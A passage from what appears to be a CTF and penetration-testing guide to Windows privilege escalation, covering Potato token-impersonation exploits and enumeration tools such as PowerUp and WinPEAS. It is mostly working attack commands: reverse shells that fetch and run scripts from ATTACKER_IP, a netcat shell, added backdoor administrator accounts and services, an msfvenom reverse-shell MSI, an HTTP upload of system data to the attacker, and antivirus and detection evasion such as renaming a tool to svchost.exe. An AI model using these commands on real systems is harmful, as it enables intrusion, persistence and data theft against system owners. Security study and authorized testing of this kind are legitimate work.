PrintSpoofer.exe -c "net localgroup administrators attacker /add"

rem Reverse shell
PrintSpoofer.exe -c "powershell -ep bypass -c iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')"
```

**Parameters:**

- `-i` - Interact with desktop
- `-c` - Command to execute
- `-d` - Domain (for domain accounts)
- `-u` - Username
- `-p` - Password

**Execute binary as SYSTEM:**

```cmd
PrintSpoofer.exe -i -c "C:\temp\payload.exe"
```

**Alternative - PrintSpoofer64:**

```cmd
rem For 64-bit systems
PrintSpoofer64.exe -i -c cmd
```

#### GodPotato Exploitation

**Requirements:**

- SeImpersonatePrivilege enabled
- Windows Server 2012-2022, Windows 8-11

**Download and transfer:**

```cmd
certutil -urlcache -f http://ATTACKER_IP/GodPotato.exe C:\temp\gp.exe
```

**Basic exploitation:**

```cmd
rem Execute command
GodPotato.exe -cmd "cmd /c whoami"

rem Add user
GodPotato.exe -cmd "cmd /c net user attacker Pass123! /add"
GodPotato.exe -cmd "cmd /c net localgroup administrators attacker /add"

rem Interactive shell
GodPotato.exe -cmd "cmd"

rem Reverse shell
GodPotato.exe -cmd "powershell -ep bypass -c iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')"
```

**Execute binary:**

```cmd
GodPotato.exe -cmd "C:\temp\nc.exe -e cmd.exe ATTACKER_IP 4444"
```

**Verify SYSTEM privileges:**

```cmd
GodPotato.exe -cmd "cmd /c whoami > C:\temp\output.txt"
type C:\temp\output.txt
```

#### Metasploit Potato Exploitation

**Using Metasploit for automated token impersonation:**

**Generic approach:**

```bash
msfconsole

# After obtaining meterpreter session
sessions -i 1

# Load incognito module
load incognito

# List available tokens
list_tokens -u

# Impersonate SYSTEM token
impersonate_token "NT AUTHORITY\\SYSTEM"

# Verify
getuid
```

**Specific Potato modules:**

**Rotten Potato:**

```bash
use exploit/windows/local/ms16_075_reflection
set SESSION 1
set LHOST ATTACKER_IP
set LPORT 4444
exploit
```

**Juicy Potato:**

```bash
use exploit/windows/local/ms16_075_reflection_juicy
set SESSION 1
set CLSID {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
exploit
```

**PrintSpoofer:**

```bash
use exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
set SESSION 1
exploit
```

#### Manual Token Impersonation with PowerShell

**PowerShell script for token stealing:**

```powershell
# Requires SeDebugPrivilege
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class TokenManipulation {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
}
"@

# Find SYSTEM process
$systemProc = Get-Process -Name "winlogon" | Select-Object -First 1

# Open process handle
$processHandle = [TokenManipulation]::OpenProcess(0x0400, $false, $systemProc.Id)

# Open process token
$tokenHandle = [IntPtr]::Zero
[TokenManipulation]::OpenProcessToken($processHandle, 0x0002, [ref]$tokenHandle)

# Impersonate token
[TokenManipulation]::ImpersonateLoggedOnUser($tokenHandle)

# Execute command as SYSTEM
cmd /c whoami
```

**[Inference]** Manual token impersonation is complex and error-prone. Prebuilt Potato tools are more reliable for CTF scenarios.

#### Troubleshooting Potato Exploits

**Common issues:**

**Issue 1: "SeImpersonatePrivilege not enabled"**

```cmd
rem Verify privilege status
whoami /priv | findstr SeImpersonate

rem If disabled, may need to enable (requires specific conditions)
```

**Issue 2: Wrong CLSID for Juicy Potato**

```cmd
rem Test different CLSIDs
rem Download CLSID list from: https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

**Issue 3: Print Spooler not running**

```cmd
rem Check service status
sc query spooler

rem Start if stopped (may require privileges)
sc start spooler
net start spooler
```

**Issue 4: Firewall blocking Rogue Potato**

```cmd
rem Check if port 135 is reachable from target to attacker
Test-NetConnection -ComputerName ATTACKER_IP -Port 135
```

**Issue 5: Exploit crashes**

```cmd
rem Try different CreateProcessWithToken type
jp.exe -t 0 ...
jp.exe -t 1 ...
```

### SeAssignPrimaryToken Vulnerability

SeAssignPrimaryTokenPrivilege allows a process to assign a primary token to a new process. Similar to SeImpersonatePrivilege, this can be exploited for privilege escalation.

#### Understanding SeAssignPrimaryTokenPrivilege

**What it allows:**

- Assign a primary token to processes created by the calling process
- Replace token of a child process
- Similar exploitation techniques to SeImpersonatePrivilege

**Difference from SeImpersonatePrivilege:**

- **SeImpersonatePrivilege** - Impersonate existing token
- **SeAssignPrimaryTokenPrivilege** - Assign token to new process
- Both achieve similar privilege escalation results

**Check for privilege:**

```cmd
whoami /priv | findstr SeAssignPrimaryToken
```

**Expected output if present:**

```
SeAssignPrimaryTokenPrivilege  Replace a process level token         Enabled
```

#### Accounts with SeAssignPrimaryTokenPrivilege

**Common accounts:**

- LocalSystem
- NetworkService
- LocalService
- SQL Server service accounts
- Scheduled task accounts
- Some IIS application pools

**Enumerate accounts with privilege:**

```powershell
# Check current user
whoami /priv

# Check all users (requires admin)
secedit /export /areas USER_RIGHTS /cfg C:\temp\rights.txt
Get-Content C:\temp\rights.txt | Select-String "SeAssignPrimaryTokenPrivilege"
```

#### Exploiting SeAssignPrimaryTokenPrivilege

**[Inference]** Most Potato exploits work with either SeImpersonatePrivilege OR SeAssignPrimaryTokenPrivilege.

**Using Juicy Potato:**

```cmd
rem Same syntax as SeImpersonatePrivilege exploitation
jp.exe -l 1337 -p cmd.exe -a "/c net user attacker Pass123! /add" -t * -c {CLSID}
```

**Using PrintSpoofer:**

```cmd
PrintSpoofer.exe -i -c cmd
```

**Using Rogue Potato:**

```cmd
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe" -l 9999
```

**Using GodPotato:**

```cmd
GodPotato.exe -cmd "cmd /c whoami"
```

#### Manual Exploitation with CreateProcessAsUser

**PowerShell approach:**

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class ProcessManipulation {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
}
"@

# Get SYSTEM token (requires additional code)
# Create process with token
```

**[Inference]** Manual exploitation requires extensive Windows API knowledge. Potato tools are recommended for practical exploitation.

#### Combined Privilege Exploitation

**Check for both privileges:**

```cmd
whoami /priv | findstr "SeImpersonate\|SeAssignPrimaryToken"
```

**PowerShell check:**

```powershell
$privs = whoami /priv
if ($privs -match "SeImpersonatePrivilege.*Enabled" -or $privs -match "SeAssignPrimaryTokenPrivilege.*Enabled") {
    Write-Host "[+] Token impersonation possible"
    Write-Host "[*] Recommended: PrintSpoofer, GodPotato, or RoguePotato"
} else {
    Write-Host "[-] No impersonation privileges found"
}
```

#### Automated Detection and Exploitation

**PowerUp check:**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
Invoke-AllChecks | Select-String "SeImpersonate\|SeAssignPrimaryToken"
```

**WinPEAS check:**

```cmd
winpeas.exe quiet systeminfo
```

**Watson kernel exploit suggester:**

```cmd
watson.exe
```

#### Best Practices for Token Impersonation

**Exploitation order (from most to least reliable):**

1. **GodPotato** - Latest, works on Windows 8-11, Server 2012-2022
2. **PrintSpoofer** - Universal, requires Print Spooler
3. **RoguePotato** - Windows 10 1809+, requires network access
4. **Juicy Potato** - Older systems (pre-Windows 10 1809)

**Selection criteria:**

```powershell
# Check Windows version
[System.Environment]::OSVersion.Version

# Windows 10 build numbers:
# 1507 = 10240
# 1607 = 14393
# 1809 = 17763
# 21H1 = 19043
# 21H2 = 19044

$build = [System.Environment]::OSVersion.Version.Build

if ($build -ge 17763) {
    Write-Host "Use: GodPotato or RoguePotato"
} elseif ($build -ge 10240) {
    Write-Host "Use: JuicyPotato"
} else {
    Write-Host "Use: RottenPotato or HotPotato"
}

# Always check if Print Spooler is available
if ((Get-Service Spooler).Status -eq "Running") {
    Write-Host "PrintSpoofer is also available"
}
```

---

**Important Related Topics:**

- **Windows Access Tokens Deep Dive** - Understanding token types, integrity levels, and manipulation
- **COM/DCOM Architecture** - How Potato exploits abuse Component Object Model
- **Windows Service Hardening** - Modern Windows protections against service exploitation
- **Active Directory Privilege Paths** - Domain-level privilege escalation beyond local exploitation

---

## Windows Privilege Escalation Tools

Automated enumeration tools rapidly identify privilege escalation vectors by scanning for misconfigurations, missing patches, and exploitable conditions. These tools are essential for efficient CTF exploitation and authorized penetration testing.

### Sherlock (PowerShell)

Sherlock is a PowerShell script that identifies missing patches for known Windows privilege escalation exploits. It checks the system against a database of critical vulnerabilities.

[Inference: Sherlock is no longer actively maintained but remains useful for legacy systems]

#### Installation and Setup

```powershell
# Download from GitHub
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')

# Alternative: Download to disk
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1" -OutFile "Sherlock.ps1"

# Import module
Import-Module .\Sherlock.ps1

# If execution policy blocks, bypass it
powershell -ep bypass
Import-Module .\Sherlock.ps1
```

#### Basic Usage

```powershell
# Run all vulnerability checks
Find-AllVulns

# Output to file
Find-AllVulns | Out-File C:\temp\sherlock_results.txt

# Run from memory (one-liner)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns
```

#### Individual Exploit Checks

```powershell
# Check specific vulnerabilities
Find-MS10015  # User Mode to Ring (KiTrap0D)
Find-MS10092  # Task Scheduler
Find-MS13053  # NTUserMessageCall Win32k Kernel Pool Overflow
Find-MS13081  # TrackPopupMenuEx Win32k NULL Page
Find-MS14058  # TrackPopupMenu Win32k Kernel Pool Overflow
Find-MS15051  # Windows Kernel Mode Drivers
Find-MS15078  # Font Driver Buffer Overflow
Find-MS16016  # WebDAV
Find-MS16032  # Secondary Logon Handle
Find-MS16034  # Windows Kernel-Mode Drivers EoP
```

#### Common Exploits Checked by Sherlock

**MS10-015 (KiTrap0D)**

- Affects: Windows XP, Server 2003, Vista, Server 2008, 7
- KB: KB977165

**MS10-092 (Task Scheduler)**

- Affects: Windows Vista, Server 2008, 7
- KB: KB2305420

**MS13-053 (NTUserMessageCall)**

- Affects: Windows 7, Server 2008 R2
- KB: KB2829361

**MS13-081 (TrackPopupMenuEx)**

- Affects: Windows 7, Server 2008 R2
- KB: KB2870008

**MS14-058 (TrackPopupMenu)**

- Affects: Windows Server 2003, 2008, 2012
- KB: KB3000061

**MS15-051 (Windows Kernel)**

- Affects: Windows 2003-2012 R2
- KB: KB3057191

**MS16-016 (WebDAV)**

- Affects: Windows Vista-10, Server 2008-2012 R2
- KB: KB3136041

**MS16-032 (Secondary Logon)**

- Affects: Windows 7-10, Server 2008-2012 R2
- KB: KB3139914

#### Interpreting Results

```powershell
# Sherlock output format example:
Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems
```

**VulnStatus interpretations:**

- **Appears Vulnerable**: Patch not installed, likely exploitable
- **Not Vulnerable**: Patch is installed
- **Not supported on 64-bit systems**: Exploit requires 32-bit

#### Troubleshooting and Bypass

```powershell
# If script execution is blocked
Set-ExecutionPolicy Bypass -Scope Process -Force

# Load from base64 encoded string (AV bypass)
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content .\Sherlock.ps1 -Raw)))
$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
IEX $decoded

# Alternative download method (avoid WebClient detection)
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
IEX $wc.DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
```

### JAWS (Just Another Windows (Enum) Script)

JAWS is a comprehensive PowerShell enumeration script designed for rapid privilege escalation reconnaissance, particularly useful in limited-access scenarios.

#### Installation and Setup

```powershell
# Download from GitHub
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1')

# Download to disk
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1" -OutFile "jaws-enum.ps1"

# Alternative download with curl (Windows 10+)
curl https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1 -o jaws-enum.ps1
```

#### Basic Usage

```powershell
# Run with default settings
.\jaws-enum.ps1

# Output to file
.\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

# Run from memory
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1')
```

#### Advanced Options

```powershell
# Specify output location
.\jaws-enum.ps1 -OutputFilename C:\temp\results.txt

# Run without writing to disk (pure memory execution)
powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1')"
```

#### Information Gathered by JAWS

**System Information:**

- Windows version and build
- Architecture (x86/x64)
- Hostname and domain
- Current user and privileges
- Environment variables

**Network Configuration:**

- Network adapters
- IP configuration
- Routing tables
- ARP cache
- DNS cache
- Active connections
- Firewall status
- Network shares

**User Enumeration:**

- Local users and groups
- Domain users (if applicable)
- Administrator accounts
- RDP users
- Logged-in users
- Recently accessed files

**Installed Software:**

- Installed programs
- Running processes
- Installed patches (KBs)
- Antivirus products
- Interesting files

**Privilege Escalation Vectors:**

- Unquoted service paths
- Weak service permissions
- AlwaysInstallElevated
- Credential files
- Cached credentials
- Scheduled tasks
- Startup programs
- Registry autoruns

**File System:**

- Writable directories in Program Files
- User directories
- Interesting files (passwords, configs)
- Recently modified files

#### Example Output Analysis

```
[+] System Information
    Computer Name: DESKTOP-ABC123
    OS Version: Microsoft Windows 10 Pro
    Architecture: AMD64
    Current User: DESKTOP-ABC123\lowpriv
    
[!] Potentially Vulnerable Services
    Service: VulnService
    Path: C:\Program Files\Vulnerable App\service.exe
    Permissions: BUILTIN\Users:(F)
    
[!] Unquoted Service Paths
    Service: BadService  
    Path: C:\Program Files\My Application\app.exe
    StartMode: Auto
    
[!] AlwaysInstallElevated
    Registry keys set! Any user can install MSI as SYSTEM
```

#### Integration with Other Tools

```powershell
# Combine JAWS output with manual checks
.\jaws-enum.ps1 -OutputFilename jaws.txt
Get-Content jaws.txt | Select-String "Potentially Vulnerable"

# Parse specific sections
Get-Content jaws.txt | Select-String -Pattern "Service|Unquoted|AlwaysInstall" -Context 2,2
```

### PrivEsc (PowerShell)

PrivEsc (also known as PowerUp or Invoke-PrivescAudit) focuses on specific misconfigurations that enable privilege escalation.

[Inference: Multiple tools exist with similar names; PowerUp by PowerShellMafia is most common]

#### Installation and Setup (PowerUp)

```powershell
# Download PowerUp
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# Download to disk
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" -OutFile "PowerUp.ps1"

# Import module
Import-Module .\PowerUp.ps1
```

#### Core Functions

```powershell
# Run all privilege escalation checks
Invoke-AllChecks

# Save results to file
Invoke-AllChecks | Out-File -FilePath C:\temp\powerup.txt

# Format output as HTML
Invoke-AllChecks | ConvertTo-Html | Out-File C:\temp\powerup.html
```

#### Specific Checks

```powershell
# Service enumeration
Get-ServiceUnquoted           # Unquoted service paths
Get-ModifiableServiceFile     # Services with writable binaries
Get-ModifiableService         # Services with weak permissions
Get-ServiceDetail             # Detailed service information

# Registry checks
Get-RegistryAlwaysInstallElevated  # AlwaysInstallElevated policy
Get-RegistryAutoLogon              # Autologon credentials
Get-ModifiableRegistryAutoRun      # Writable autorun registry keys

# Scheduled tasks
Get-ModifiableScheduledTaskFile    # Tasks with writable executables

# File/directory permissions
Find-ProcessDLLHijack              # DLL hijacking opportunities
Find-PathDLLHijack                 # PATH-based DLL hijacking
Get-UnattendedInstallFile          # Unattend.xml files with credentials

# Application-specific
Get-Webconfig                      # Web.config files (credentials)
Get-ApplicationHost                # ApplicationHost.config files
Get-SiteListPassword               # McAfee SiteList.xml passwords
Get-CachedGPPPassword              # Group Policy Preferences passwords
```

#### Exploitation Functions

```powershell
# Abuse unquoted service paths
Write-ServiceBinary -Name 'VulnService' -Path 'C:\Program Files\Vulnerable\service.exe'

# Install backdoor service
Install-ServiceBinary -Name 'UpdateService' -Path 'C:\Windows\Temp\backdoor.exe'

# Modify service binary path
Set-ServiceBinPath -Name 'VulnService' -Path 'C:\temp\evil.exe'

# Restore original service configuration
Restore-ServiceBinary -Name 'VulnService'
```

#### AlwaysInstallElevated Exploitation

```powershell
# Check if enabled
Get-RegistryAlwaysInstallElevated

# Create malicious MSI
Write-UserAddMSI

# If enabled, any user can install MSI with SYSTEM privileges
# Generate MSI with msfvenom:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi
# Then: msiexec /quiet /qn /i C:\temp\evil.msi
```

#### Service Abuse Examples

```powershell
# Find modifiable services
Get-ModifiableService

# Example output:
ServiceName    : VulnService
Path           : C:\Program Files\App\service.exe
ModifiablePath : C:\Program Files\App\service.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -Name 'VulnService'

# Exploit the service
Install-ServiceBinary -Name 'VulnService' -Path 'C:\Program Files\App\service.exe'
Restart-Service VulnService
```

### WinPEAS (.NET/Batch)

WinPEAS (Windows Privilege Escalation Awesome Script) is the most comprehensive automated enumeration tool, available in multiple formats for different scenarios.

#### Versions and Download

```cmd
REM WinPEAS.exe (.NET executable - most features)
REM Download: https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
REM Download: https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe

REM WinPEAS.bat (batch script - no dependencies)
REM Download: https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat
```

```powershell
# PowerShell download methods
# Download x64 executable
Invoke-WebRequest -Uri "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile "winPEAS.exe"

# Download x86 executable
Invoke-WebRequest -Uri "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe" -OutFile "winPEAS.exe"

# Download batch version
Invoke-WebRequest -Uri "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat" -OutFile "winPEAS.bat"

# Alternative with certutil (built-in Windows tool)
certutil -urlcache -split -f "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" winPEAS.exe
```

#### Basic Usage

```cmd
REM Run WinPEAS executable
winPEAS.exe

REM Save output to file
winPEAS.exe > output.txt

REM Run batch version
winPEAS.bat

REM Quiet mode (no banner)
winPEAS.exe quiet
```

#### Advanced Options

```cmd
REM Fast mode (skip some time-consuming checks)
winPEAS.exe fast

REM Full mode (all checks including slower ones)
winPEAS.exe full

REM Search for specific keywords in results
winPEAS.exe searchfast filesinfo

REM Specific checks only
winPEAS.exe systeminfo

REM No color output (better for file output)
winPEAS.exe notcolor

REM Wait between tests (avoid detection)
winPEAS.exe wait

REM Combined options
winPEAS.exe cmd fast notcolor > results.txt
```

#### Color Coding System

WinPEAS uses color coding to highlight findings by severity:

- **Red/Magenta**: High-priority findings (almost certainly exploitable)
- **Yellow**: Medium-priority findings (likely exploitable)
- **Green**: Informational findings
- **Cyan**: Section headers
- **Gray**: Standard output

#### Information Categories

**System Information:**

- Windows version, build, architecture
- PowerShell versions
- Environment variables
- Current user and privileges
- Antivirus detection
- UAC configuration
- Credential Guard status

**User Enumeration:**

- Local users and groups
- Password policy
- Recently accessed items
- Clipboard contents
- RDP sessions
- Logged users

**Processes and Services:**

- Running processes
- Binary permissions
- Service misconfigurations
- Unquoted service paths
- DLL hijacking opportunities

**Applications:**

- Installed software
- Running applications
- Vulnerable software versions
- Browser stored data
- Interesting installed programs

**Network Information:**

- Network interfaces
- Active connections
- Routing tables
- Firewall rules
- DNS cache
- Network shares
- SMB sessions

**Windows Credentials:**

- Stored credentials
- DPAPI credentials
- Recently used credentials
- Saved RDP connections
- Vault credentials
- Windows Vault
- Credential Manager

**Files and Registry:**

- Interesting files
- Writable folders
- Modified system files
- Registry autorun entries
- Scheduled tasks
- Startup programs

**Known CVEs:**

- Missing patches
- Exploitable vulnerabilities
- Watson-style exploit suggestions

#### Example Output Interpretation

```
[+] CURRENT USER
   [i] Check if you are inside the Administrators group or if you have enabled any token
  Username: DESKTOP-ABC\lowpriv
  Groups:   BUILTIN\Users
  Privs:    SeChangeNotifyPrivilege (Enabled)

[!] SERVICE BINARY PERMISSIONS
   [?] Check if you can modify any service binary
  VulnService(BUILTIN\Users [WriteData/CreateFiles])
    C:\Program Files\VulnApp\service.exe
    
[!] UNQUOTED SERVICE PATHS
  BadService
    Path: C:\Program Files\My Application\app.exe
    Start: Automatic
    
[!] ALWAYS INSTALL ELEVATED
   [!] AlwaysInstallElevated set to 1 in HKLM!
   [!] AlwaysInstallElevated set to 1 in HKCU!
```

**Priority interpretation:**

- Findings with `[!]` are high priority
- `[?]` indicates potential vectors requiring validation
- `[i]` provides informational context

#### Specific Enumeration Modes

```cmd
REM System information only
winPEAS.exe systeminfo

REM User information
winPEAS.exe userinfo

REM Process information
winPEAS.exe processinfo

REM Services information
winPEAS.exe servicesinfo

REM Application enumeration
winPEAS.exe applicationsinfo

REM Network configuration
winPEAS.exe networkinfo

REM File system search
winPEAS.exe filesinfo

REM Credential search
winPEAS.exe windowscreds

REM Browser data
winPEAS.exe browserinfo

REM Check for CVEs
winPEAS.exe searchfast cve
```

#### Avoiding Detection

```cmd
REM Use batch version (less likely to trigger AV)
winPEAS.bat

REM Run with delays
winPEAS.exe wait

REM Exclude certain checks that trigger alerts
winPEAS.exe systeminfo userinfo

REM Output to file and exfiltrate later
winPEAS.exe notcolor > C:\Windows\Temp\debug.log

REM Obfuscate filename
copy winPEAS.exe C:\Windows\Temp\svchost.exe
C:\Windows\Temp\svchost.exe
```

#### Integration with Exploit Workflow

```powershell
# Download and execute in memory (if .NET version allows)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5/winPEAS.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[winPEAS.Program]::Main("")

# Alternative: Direct execution after download
IWR -Uri http://10.10.14.5/winPEAS.exe -OutFile wp.exe
.\wp.exe
```

#### Combining Multiple Tools

```powershell
# Run multiple enumeration tools in sequence
# 1. Quick check with Sherlock
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Sherlock.ps1')
Find-AllVulns | Out-File sherlock.txt

# 2. Comprehensive check with WinPEAS
.\winPEAS.exe > winpeas.txt

# 3. Specific service checks with PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerUp.ps1')
Invoke-AllChecks | Out-File powerup.txt

# 4. Compile findings
Get-Content *.txt | Select-String -Pattern "vulnerable|unquoted|writable|elevated" -Context 2
```

### Tool Comparison Matrix

|Feature|Sherlock|JAWS|PowerUp|WinPEAS|
|---|---|---|---|---|
|**Patch Detection**|✓✓✓|✓|✗|✓✓✓|
|**Service Misconfiguration**|✗|✓✓|✓✓✓|✓✓✓|
|**Credential Search**|✗|✓✓|✓✓|✓✓✓|
|**File Permissions**|✗|✓✓|✓✓|✓✓✓|
|**Network Enumeration**|✗|✓✓✓|✗|✓✓✓|
|**Active Maintenance**|✗|✓|✓|✓✓✓|
|**Ease of Use**|✓✓✓|✓✓✓|✓✓|✓✓✓|
|**Stealth**|✓✓|✓✓|✓✓|✓|
|**No Dependencies**|✗ (PS)|✗ (PS)|✗ (PS)|✓ (bat)|

**Legend:** ✓✓✓ Excellent | ✓✓ Good | ✓ Basic | ✗ Not Available

---

### Windows Exploit Suggester

#### Understanding Windows Exploit Suggester

Windows Exploit Suggester compares a target system's patch level against the Microsoft vulnerability database to identify missing patches that could be exploited for privilege escalation.

**Two primary versions:**

- **Windows-Exploit-Suggester** (Python-based, original)
- **WES-NG** (Windows Exploit Suggester - Next Generation)

#### Gathering System Information

**Collect systeminfo output on target:**

```cmd
systeminfo > systeminfo.txt

REM Alternative with more detail
systeminfo /fo csv > systeminfo.csv

REM Get installed hotfixes
wmic qfe list full > hotfixes.txt
```

**PowerShell alternative:**

```powershell
# Detailed system information
Get-ComputerInfo | Out-File systeminfo.txt

# Installed updates
Get-HotFix | Select-Object HotFixID, Description, InstalledOn | Out-File hotfixes.txt

# Combined output
systeminfo | Out-File -Encoding ASCII systeminfo.txt
Get-HotFix | Format-Table -AutoSize | Out-File -Append systeminfo.txt
```

**Transfer systeminfo.txt to attacker machine:**

```powershell
# Via HTTP upload
$body = Get-Content systeminfo.txt -Raw
Invoke-WebRequest -Uri "http://ATTACKER_IP/upload" -Method POST -Body $body

# Via SMB
Copy-Item systeminfo.txt \\ATTACKER_IP\share\systeminfo.txt

# Via base64 encoding (for copy/paste)
$content = Get-Content systeminfo.txt -Raw
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($content))
```

#### Windows Exploit Suggester (Classic)

**Installation on Kali:**

```bash
# Clone repository
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester

# Install dependencies
pip install xlrd --upgrade

# Update vulnerability database
./windows-exploit-suggester.py --update
# Creates xls file: 2024-xx-xx-mssb.xls
```

**Running the tool:**

```bash
# Basic usage
python windows-exploit-suggester.py --database 2024-xx-xx-mssb.xls --systeminfo systeminfo.txt

# Show only high-impact exploits
python windows-exploit-suggester.py --database 2024-xx-xx-mssb.xls --systeminfo systeminfo.txt --impact MS

# Include hotfixes
python windows-exploit-suggester.py --database 2024-xx-xx-mssb.xls --systeminfo systeminfo.txt --hotfixes hotfixes.txt

# Output to file
python windows-exploit-suggester.py --database 2024-xx-xx-mssb.xls --systeminfo systeminfo.txt -o results.txt
```

**Output interpretation:**

```
[*] Initiating systeminfo parser
[*] OS: Windows Server 2016 Standard
[*] Architecture: x64
[*] Hotfixes: 15 detected

[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privilege (3143141)
[*] https://www.exploit-db.com/exploits/39719/
[M] MS16-075: Security Update for Windows SMB Server (3164038)
[*] https://www.exploit-db.com/exploits/40085/
```

**Exploit ranking:**

- `[E]` - Exploits available (high priority)
- `[M]` - Bulletin exists, exploit may be available
- `[*]` - Informational reference

#### WES-NG (Next Generation)

**Installation:**

```bash
# Clone repository
git clone https://github.com/bitsadmin/wesng.git
cd wesng

# Install dependencies
pip3 install --upgrade -r requirements.txt

# Update CVE database
python3 wes.py --update
```

**Running WES-NG:**

```bash
# Basic scan
python3 wes.py systeminfo.txt

# Specify definitions file
python3 wes.py systeminfo.txt --definitions definitions.zip

# Filter by impact
python3 wes.py systeminfo.txt --impact "Critical" "High"

# Filter by exploitability
python3 wes.py systeminfo.txt --exploits-only

# Output formats
python3 wes.py systeminfo.txt --output results.csv
python3 wes.py systeminfo.txt --output results.json

# Verbose output
python3 wes.py systeminfo.txt -v
```

**Advanced filtering:**

```bash
# Show only kernel exploits
python3 wes.py systeminfo.txt --filter "Elevation of Privilege"

# Exclude specific products
python3 wes.py systeminfo.txt --hide "Internet Explorer" "Edge"

# Filter by CVE year
python3 wes.py systeminfo.txt --muc-lookup | grep "CVE-2021"
```

**Output example:**

```
Date: 20241011
CVE: CVE-2021-1675
Title: Windows Print Spooler Remote Code Execution Vulnerability
Affected product: Windows Server 2016
Affected component: Print Spooler
Severity: Critical
Impact: Elevation of Privilege
Exploit: https://github.com/calebstewart/CVE-2021-1675
```

#### Metasploit Local Exploit Suggester

**Within Meterpreter session:**

```bash
# Background current session
background

# Use local exploit suggester
use post/multi/recon/local_exploit_suggester

# Set session
set SESSION 1

# Run module
run
```

**Output interpretation:**

```
[*] 10.10.10.10 - Collecting local exploits for x64/windows...
[*] 10.10.10.10 - 34 exploit checks are being tried...
[+] 10.10.10.10 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target appears to be vulnerable.
[+] 10.10.10.10 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Post module execution completed
```

**Exploit vulnerable findings:**

```bash
# Use suggested exploit
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc

# Set session
set SESSION 1

# Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
